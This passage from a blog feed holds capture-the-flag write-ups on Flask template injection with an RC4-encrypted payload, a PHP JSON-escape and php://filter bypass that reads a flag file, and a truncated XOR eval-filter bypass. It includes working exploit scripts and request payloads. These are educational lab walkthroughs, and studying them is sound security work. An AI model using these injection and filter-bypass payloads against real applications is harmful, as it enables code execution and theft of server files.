id="flask模板注入之rc4加密"><a href="#flask模板注入之rc4加密" class="headerlink" title="flask模板注入之rc4加密"></a>flask模板注入之rc4加密</h1><p> 打开页面后，发现是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome To Find Secret</span><br></pre></td></tr></table></figure><p>然后查看页面源码以及抓包，也发现不了有用信息，所以我们用dirsearch.py工具扫以下，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secret</span><br></pre></td></tr></table></figure><p>回显出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tell me your secret.I will encrypt it so other can&#x27;t see</span><br></pre></td></tr></table></figure><p>通过这句话，推测要传参，且参数为secret，所以构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secret?secret=1</span><br></pre></td></tr></table></figure><p>发现回显一个字母，所以尝试增长字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secret?secret=11111111111111111111111</span><br></pre></td></tr></table></figure><p>发现报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">UnicodeDecodeError</span><br><span class="line"></span><br><span class="line">UnicodeDecodeError: &#x27;ascii&#x27; codec can&#x27;t decode byte 0xfb in position 4: ordinal not in range(128)</span><br><span class="line">Traceback (most recent call last)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2309, in __call__</span><br><span class="line"></span><br><span class="line">    return self.wsgi_app(environ, start_response)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2295, in wsgi_app</span><br><span class="line"></span><br><span class="line">    response = self.handle_exception(e)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1741, in handle_exception</span><br><span class="line"></span><br><span class="line">    reraise(exc_type, exc_value, tb)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2292, in wsgi_app</span><br><span class="line"></span><br><span class="line">    response = self.full_dispatch_request()</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1815, in full_dispatch_request</span><br><span class="line"></span><br><span class="line">    rv = self.handle_user_exception(e)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1718, in handle_user_exception</span><br><span class="line"></span><br><span class="line">    reraise(exc_type, exc_value, tb)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1813, in full_dispatch_request</span><br><span class="line"></span><br><span class="line">    rv = self.dispatch_request()</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1799, in dispatch_request</span><br><span class="line"></span><br><span class="line">    return self.view_functions[rule.endpoint](**req.view_args)</span><br><span class="line"></span><br><span class="line">    File &quot;/app/app.py&quot;, line 35, in secret</span><br><span class="line"></span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/templating.py&quot;, line 149, in render_template_string</span><br><span class="line"></span><br><span class="line">    return _render(ctx.app.jinja_env.from_string(source),</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 880, in from_string</span><br><span class="line"></span><br><span class="line">    return cls.from_code(self, self.compile(source), globals, None)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 579, in compile</span><br><span class="line"></span><br><span class="line">    source = self._parse(source, name, filename)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 497, in _parse</span><br><span class="line"></span><br><span class="line">    return Parser(self, source, name, encode_filename(filename)).parse()</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/parser.py&quot;, line 40, in __init__</span><br><span class="line"></span><br><span class="line">    self.stream = environment._tokenize(source, name, filename, state)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 528, in _tokenize</span><br><span class="line"></span><br><span class="line">    source = self.preprocess(source, name, filename)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/jinja2/environment.py&quot;, line 522, in preprocess</span><br><span class="line"></span><br><span class="line">    self.iter_extensions(), text_type(source))</span><br><span class="line"></span><br><span class="line">    UnicodeDecodeError: &#x27;ascii&#x27; codec can&#x27;t decode byte 0xfb in position 4: ordinal not in range(128)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们从报错的信息中找到flask模板注入的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=render_template_string(safe(deS))</span><br></pre></td></tr></table></figure><p>所以点击去看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if(secret==None):</span><br><span class="line"></span><br><span class="line">        return &#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br><span class="line"></span><br><span class="line">    rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line"></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    if &#x27;ciscn&#x27; in a.lower():</span><br><span class="line"></span><br><span class="line">        return &#x27;flag detected!&#x27;</span><br><span class="line"></span><br><span class="line">   return a</span><br></pre></td></tr></table></figure><p>可知，会对get提交的参数secret的值进行rc4解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line"></span><br><span class="line">deS=rc.do_crypt(secret)</span><br></pre></td></tr></table></figure><p>所以，我们需要对secret进行加密，然后解密后的secret会赋值给des，然后用render_template_string()函数进行模板渲染，所以我们可以使用内置类来执行命令，从而造成模板注入，但是内置类需要先rc4加密，所以exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">def rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):</span><br><span class="line">    # print(&quot;RC4加密主函数&quot;)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    return  crypt</span><br><span class="line">def rc4_init_sbox(key):</span><br><span class="line">    s_box = list(range(256))  </span><br><span class="line">    # print(&quot;原来的 s 盒：%s&quot; % s_box)</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span><br><span class="line">    return s_box</span><br><span class="line">def rc4_excrypt(plain, box):</span><br><span class="line">    # print(&quot;调用加密程序成功。&quot;)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = 0</span><br><span class="line">    for s in plain:</span><br><span class="line">        i = (i + 1) % 256</span><br><span class="line">        j = (j + box[i]) % 256</span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % 256</span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = &quot;&quot;.join(res)</span><br><span class="line">    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))</span><br><span class="line">    return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span><br><span class="line">rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即可得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure><p>然后构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure><p>即可得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;flask模板注入之arjun和tplmap工具的使用&quot;&gt;&lt;a href=&quot;#flask模板注入之arjun和tplmap工具的使用&quot; class=&quot;headerlink&quot; title=&quot;flask模板注入之arjun和tplmap工具的使用&quot;&gt;&lt;/a&gt;flask</summary>
      
    
    
    
    
    <category term="模板" scheme="http://example.com/tags/%E6%A8%A1%E6%9D%BF/"/>
    
  </entry>
  
  <entry>
    <title>json字符绕过以及伪协议</title>
    <link href="http://example.com/2021/10/05/json%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>http://example.com/2021/10/05/json%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2021-10-04T16:00:00.000Z</published>
    <updated>2021-10-05T02:42:19.827Z</updated>
    
    <content type="html"><![CDATA[<h1 id="json字符绕过以及伪协议"><a href="#json字符绕过以及伪协议" class="headerlink" title="json字符绕过以及伪协议"></a>json字符绕过以及伪协议</h1><p>打开页面，发现是源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  show_source(__FILE__);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($str) &#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    // no path traversal</span><br><span class="line">    &#x27;\.\.&#x27;,</span><br><span class="line">    // no stream wrapper</span><br><span class="line">    &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;,</span><br><span class="line">    // no data exfiltration</span><br><span class="line">    &#x27;flag&#x27;</span><br><span class="line">  ];</span><br><span class="line">  $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;;</span><br><span class="line">  if (preg_match($regexp, $str)) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$json = json_decode($body, true);</span><br><span class="line"></span><br><span class="line">if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123;</span><br><span class="line">  $page = $json[&#x27;page&#x27;];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  if (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// no data exfiltration!!!</span><br><span class="line">$content = preg_replace(&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);</span><br><span class="line">echo json_encode([&#x27;content&#x27; =&gt; $content]); </span><br></pre></td></tr></table></figure><p>通过分析源码，我们可知道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$body=file_get_contents(&#x27;php://input&#x27;);</span><br></pre></td></tr></table></figure><p>是$body将接受post提交的数据</p><p>而代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$json=json_decode($body,true);</span><br></pre></td></tr></table></figure><p>是将$body进行json解码</p><p>而从源码中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function is_valid($str) &#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    // no path traversal</span><br><span class="line">    &#x27;\.\.&#x27;,</span><br><span class="line">    // no stream wrapper</span><br><span class="line">    &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;,</span><br><span class="line">    // no data exfiltration</span><br><span class="line">    &#x27;flag&#x27;</span><br><span class="line">  ];</span><br><span class="line">  $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;;</span><br><span class="line">  if (preg_match($regexp, $str)) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知，这个自定义函数is_valid()的作用是正则过滤掉一些关键词，从</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$banword = [</span><br><span class="line">    // no path traversal</span><br><span class="line">    &#x27;\.\.&#x27;,</span><br><span class="line">    // no stream wrapper</span><br><span class="line">    &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;,</span><br><span class="line">    // no data exfiltration</span><br><span class="line">    &#x27;flag&#x27;</span><br><span class="line">  ];</span><br></pre></td></tr></table></figure><p>我们可以知道.和flag，以及一些协议都被过滤了，而我们看向这个if</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123;</span><br><span class="line">  $page = $json[&#x27;page&#x27;];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  if (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们知道我们需要$body不包含过滤的关键词，$json和$json[‘page’]不为空，从而让我们可以利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = file_get_contents($page);</span><br></pre></td></tr></table></figure><p>来读取flag，而且我们还要让$content有效，且得到的$content不包含正则过滤的关键词，从而绕过这个if</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!$content || !is_valid($content))</span><br></pre></td></tr></table></figure><p>而最后的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = preg_replace(&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);</span><br></pre></td></tr></table></figure><p>如果得到的$content中包含ctf字段的话，会用censored来代替，通过对源码的通读，我们可以知道源码中只对post提交的json编码的数据进行检验，所以我们可以利用json转义字符绕过，即将字符转为16进制，并加上\u，实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f的16进制是70，则json转义字符为\u0070</span><br></pre></td></tr></table></figure><p>因此，我们可以利用php伪协议来读取flag，即post提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;page&quot; : &quot;\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;content&quot;:&quot;ZmxhZ3tiOWRkZGExNy05NjI2LTRhODAtYTcxMC0wMzgxZTkzMWE1MzB9Cg==&quot;&#125;</span><br></pre></td></tr></table></figure><p>base64解码，即可得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;json字符绕过以及伪协议&quot;&gt;&lt;a href=&quot;#json字符绕过以及伪协议&quot; class=&quot;headerlink&quot; title=&quot;json字符绕过以及伪协议&quot;&gt;&lt;/a&gt;json字符绕过以及伪协议&lt;/h1&gt;&lt;p&gt;打开页面，发现是源码&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>异或绕过以及文件上传之.htaccess文件以及open_basedir绕过</title>
    <link href="http://example.com/2021/10/04/%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B.htaccess%E6%96%87%E4%BB%B6%E4%BB%A5%E5%8F%8Aopen_basedir%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2021/10/04/%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B.htaccess%E6%96%87%E4%BB%B6%E4%BB%A5%E5%8F%8Aopen_basedir%E7%BB%95%E8%BF%87/</id>
    <published>2021-10-03T16:00:00.000Z</published>
    <updated>2021-10-04T15:52:09.849Z</updated>
    
    <content type="html"><![CDATA[<h1 id="异或绕过以及文件上传之-htaccess文件以及open-basedir绕过"><a href="#异或绕过以及文件上传之-htaccess文件以及open-basedir绕过" class="headerlink" title="异或绕过以及文件上传之.htaccess文件以及open_basedir绕过"></a>异或绕过以及文件上传之.htaccess文件以及open_basedir绕过</h1><p>打开页面，发现是源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_the_flag()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;);</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[&#x27;_&#x27;];</span><br><span class="line"></span><br><span class="line">if (!$hhh)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">    die(&#x27;One inch long, one inch strong!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( preg_match(&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;, $hhh) )</span><br><span class="line">    die(&#x27;Try something else!&#x27;);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, 3);</span><br><span class="line">if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">eval($hhh);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过审计源码，我们可以看见一个正则过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;, $hhh)</span><br></pre></td></tr></table></figure><p>可见它过滤了数字和字母，以及一些符号，所以此时我们可以尝试着使用取反绕过或异或绕过，但是由于这里有长度绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(strlen($character_type)&gt;12)</span><br></pre></td></tr></table></figure><p>所以最后决定采用异或绕过，因此我们可以写一个exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function finds($string)&#123;</span><br><span class="line">$index=0;</span><br><span class="line">$a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];</span><br><span class="line">for($i=27;$i&lt;count($a);$i++)&#123;</span><br><span class="line">for($j=27;$j&lt;count($a);$j++)&#123;</span><br><span class="line">$x = $a[$i] ^ $a[$j];</span><br><span class="line">for($k=0;$k&lt;strlen($string);$k++)&#123;</span><br><span class="line">if(ord($string[$k])==$x)&#123;</span><br><span class="line">echo 